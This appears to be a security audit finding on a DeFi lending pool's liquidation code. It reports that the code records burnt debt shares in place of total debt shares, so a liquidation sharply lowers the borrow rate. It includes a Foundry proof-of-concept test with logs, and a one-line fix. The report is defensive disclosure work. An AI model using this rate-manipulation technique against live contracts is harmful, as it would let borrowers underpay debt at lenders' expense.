Big Admiral Dove

High

# A Reserve Borrow Rate can be significantly decreased after liquidation

## Summary

When performing a liquidation, the borrow rate of the reserve is updated by burnt debt shares instead of the remaining debt shares.

Therefore, according to the amount of the burnt shares in a liquidation, the borrow rate can be significantly decreased.

## Vulnerability Detail

In the `LiquidationLogic::executeLiquidationCall()` function, there is a `_repayDebtTokens()` function call to burn covered debt shares through the liquidation.

```solidity
  function executeLiquidationCall(
    mapping(address => DataTypes.ReserveData) storage reservesData,
    mapping(uint256 => address) storage reservesList,
    mapping(address => mapping(bytes32 => DataTypes.PositionBalance)) storage balances,
    mapping(address => DataTypes.ReserveSupplies) storage totalSupplies,
    mapping(bytes32 => DataTypes.UserConfigurationMap) storage usersConfig,
    DataTypes.ExecuteLiquidationCallParams memory params
  ) external {
    ... ...
    _repayDebtTokens(params, vars, balances[params.debtAsset], totalSupplies[params.debtAsset]);
    ... ...
  }
```

In the `_repayDebtTokens()` function, `nextDebtShares` of `debtReserveCache` is updated with burnt shares instead of the remaining debt shares.

```solidity
  function _repayDebtTokens(
    DataTypes.ExecuteLiquidationCallParams memory params,
    LiquidationCallLocalVars memory vars,
    mapping(bytes32 => DataTypes.PositionBalance) storage balances,
    DataTypes.ReserveSupplies storage totalSupplies
  ) internal {
    uint256 burnt = balances[params.position].repayDebt(totalSupplies, vars.actualDebtToLiquidate, vars.debtReserveCache.nextBorrowIndex);
    vars.debtReserveCache.nextDebtShares = burnt; // <-- Wrong here!!!
  }
```

This incorrectly updated `debtReserveCache.nextDebtShares` then is used to update the borrow rate in interest rate strategy.

Consequently, we can have conclusion that the less amount of debt is covered when running a liquidation, the lower the borrow rate gets because next borrow rate depends on the amount of burnt debt shares.

### Proof-Of-Concept

Here is a proof test case:

```solidity
// SPDX-License-Identifier: BUSL-1.1
pragma solidity 0.8.19;

import "../../../../lib/forge-std/src/console.sol";

import './PoolSetup.sol';

import {ReserveConfiguration} from './../../../../contracts/core/pool/configuration/ReserveConfiguration.sol';

import {UserConfiguration} from './../../../../contracts/core/pool/configuration/UserConfiguration.sol';

contract PoolLiquidationTest is PoolSetup {
  using UserConfiguration for DataTypes.UserConfigurationMap;
  using ReserveConfiguration for DataTypes.ReserveConfigurationMap;
  using ReserveConfiguration for DataTypes.ReserveData;

  address alice = address(1);
  address bob = address(2);

  uint256 mintAmountA = 1000 ether;
  uint256 mintAmountB = 2000 ether;
  uint256 supplyAmountA = 550 ether;
  uint256 supplyAmountB = 750 ether;
  uint256 borrowAmountB = 400 ether;

  function setUp() public {
    _setUpPool();
    pos = keccak256(abi.encodePacked(alice, 'index', uint256(0)));
  }

  // @audit-poc
  function testLiquidationDecreaseBorrowRatePoc() external {
    oracleA.updateAnswer(100e8);
    oracleB.updateAnswer(100e8);

    _mintAndApprove(alice, tokenA, mintAmountA, address(pool));
    _mintAndApprove(bob, tokenB, mintAmountB, address(pool));

    vm.startPrank(alice);
    pool.supplySimple(address(tokenA), alice, supplyAmountA, 0);
    vm.stopPrank();

    vm.startPrank(bob);
    pool.supplySimple(address(tokenB), bob, supplyAmountB, 0);
    vm.stopPrank();

    vm.startPrank(alice);
    pool.borrowSimple(address(tokenB), alice, borrowAmountB - 1 ether, 0);
    vm.stopPrank();

    // Advance time to make the position unhealthy
    vm.warp(block.timestamp + 360 days);
    oracleA.updateAnswer(100e8);
    oracleB.updateAnswer(100e8);

    // Expect the position unhealthy
    vm.startPrank(alice);
    vm.expectRevert(bytes('HEALTH_FACTOR_LOWER_THAN_LIQUIDATION_THRESHOLD'));
    pool.borrowSimple(address(tokenB), alice, 1 ether, 0);
    vm.stopPrank();

    // Print log of borrow rate before liquidation
    pool.forceUpdateReserve(address(tokenB));
    DataTypes.ReserveData memory reserveDataB = pool.getReserveData(address(tokenB));
    console.log("reserveDataB.borrowRate before:", reserveDataB.borrowRate);

    vm.startPrank(bob);
    vm.expectEmit(true, true, true, false);
    emit PoolEventsLib.LiquidationCall(address(tokenA), address(tokenB), pos, 0, 0, bob);
    pool.liquidateSimple(address(tokenA), address(tokenB), pos, 0.01 ether);
    vm.stopPrank();

    // Print log of borrow rate after liquidation
    reserveDataB = pool.getReserveData(address(tokenB));
    console.log("reserveDataB.borrowRate after: ", reserveDataB.borrowRate);
  }
}

```

And logs are:
```bash
$ forge test --match-test testLiquidationDecreaseBorrowRatePoc -vvv
[⠒] Compiling...
[⠊] Compiling 11 files with Solc 0.8.19
[⠒] Solc 0.8.19 finished in 5.89s
Compiler run successful!

Ran 1 test for test/forge/core/pool/PoolLiquidationPocTests.t.sol:PoolLiquidationTest
[PASS] testLiquidationDecreaseBorrowRatePoc() (gas: 1205596)
Logs:
  reserveDataB.borrowRate before: 105094339622641509433962264
  reserveDataB.borrowRate after:  4242953968798528786019
```

## Impact

A malicious borrower can manipulate the borrow rate of his any unhealthy positions and repay his debt with signficantly low borrow rate.

## Code Snippet

[pool/logic/LiquidationLogic.sol#L246](https://github.com/sherlock-audit/2024-06-new-scope/blob/c8300e73f4d751796daad3dadbae4d11072b3d79/zerolend-one/contracts/core/pool/logic/LiquidationLogic.sol#L246)

## Tool used

Manual Review

## Recommendation

Should update the `nextDebtShares` with `totalSupplies.debtShares`:

```diff
  function _repayDebtTokens(
    DataTypes.ExecuteLiquidationCallParams memory params,
    LiquidationCallLocalVars memory vars,
    mapping(bytes32 => DataTypes.PositionBalance) storage balances,
    DataTypes.ReserveSupplies storage totalSupplies
  ) internal {
    uint256 burnt = balances[params.position].repayDebt(totalSupplies, vars.actualDebtToLiquidate, vars.debtReserveCache.nextBorrowIndex);
-   vars.debtReserveCache.nextDebtShares = burnt;
+   vars.debtReserveCache.nextDebtShares = totalSupplies.debtShares;
  }

```